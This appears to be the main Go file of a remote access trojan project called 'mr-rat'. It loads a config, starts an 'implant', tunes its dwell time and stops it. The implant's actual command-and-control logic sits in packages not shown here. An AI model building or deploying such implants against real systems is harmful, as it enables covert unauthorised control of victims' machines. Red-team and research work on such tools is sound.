package main

import (
	"github.com/mauricetjmurphy/mr-rat/pkg/config"
	"github.com/mauricetjmurphy/mr-rat/pkg/implant"
	"log"

	"time"
)

func main() {
	// Load configuration from the file
	cfg, err := config.LoadConfig("config/config.json")
	if err != nil {
		log.Fatalf("Error loading config: %v", err)
	}

	log.Printf("Configuration loaded: %+v\n", cfg)

	// Initialize the implant with the loaded configuration
	imp := implant.NewImplant(cfg)

	// Start the implant
	imp.StartImplant()

	// Example: Adjust mean dwell time after starting
	time.Sleep(2 * time.Minute)
	imp.SetMeanDwellTime(30 * time.Second)

	// Example: Stop the implant after some time
	time.Sleep(10 * time.Minute)
	imp.StopImplant()
}
